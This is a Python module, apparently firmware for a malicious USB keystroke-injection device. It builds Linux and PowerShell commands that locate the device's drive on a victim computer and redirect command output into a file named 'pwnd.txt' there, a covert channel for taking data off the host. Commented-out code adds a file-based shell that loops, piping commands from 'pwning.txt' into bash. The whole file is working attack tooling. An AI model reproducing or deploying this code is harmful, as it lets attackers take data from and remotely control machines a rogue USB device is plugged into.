import storage


class BackChannel:
    def __init__(self):
        self.back_channel_established = False
        self.back_channel_failed = False
        self.file_based_shell_established = False
        self.mount_point = ""

        self.back_channel_filename = "pwnd.txt"
        self.forward_channel_filename = "pwning.txt"
        self.device_name = storage.getmount("/").label

    def read_back_channel(self):
        with open("/"+self.back_channel_filename) as file:
            result = file.read()
        return result.strip()

    def find_back_channel_mount_command(self):
        mount_point = f"$(lsblk -o MOUNTPOINT | grep {self.device_name})"
        find_command = f"echo {mount_point} > {mount_point}/{self.back_channel_filename}"
        return find_command

    def find_back_channel_powershell_command(self):
        mount_point = f"(gdr -name (Get-Volume -FileSystemLabel {self.device_name} | select DriveLetter).DriveLetter | select Root).Root"
        find_command = f"{mount_point} | Out-File -Encoding ascii (({mount_point}) + '{self.back_channel_filename}')"
        return find_command

    def check_for_back_channel_success(self):
        try:
            result = self.read_back_channel()
            if result:
                self.mount_point = result
                self.back_channel_established = True
        except OSError as e:
            self.mount_point = ""
            self.back_channel_established = False
            self.back_channel_failed = True
            print("NO BACK CHANNEL ESTABLISHED!!")
            print(e)

    def command_with_back_channel_linux(self, command):
        return f"{command} > {self.mount_point}/{self.back_channel_filename}"

    def command_with_back_channel_windows(self, command):
        return f"{command} | Out-File -Encoding ascii  {self.mount_point}{self.back_channel_filename}"

#    def file_based_shell_command(self):
#        file_based_bash = f"[[ ! -z $(cat {self.mount_point}/{self.forward_channel_filename}) ]] && cat {self.mount_point}/{self.forward_channel_filename} | bash &> {self.mount_point}/{self.back_channel_filename}"
#        while_true = "while true; do  {}; sleep 1; done"
#        command = while_true.format(file_based_bash)
#        return command

#    def write_forward_channel_file(self, command):
#        with open(f"/{self.forward_channel_filename}", "w") as file:
#            file.write(command)
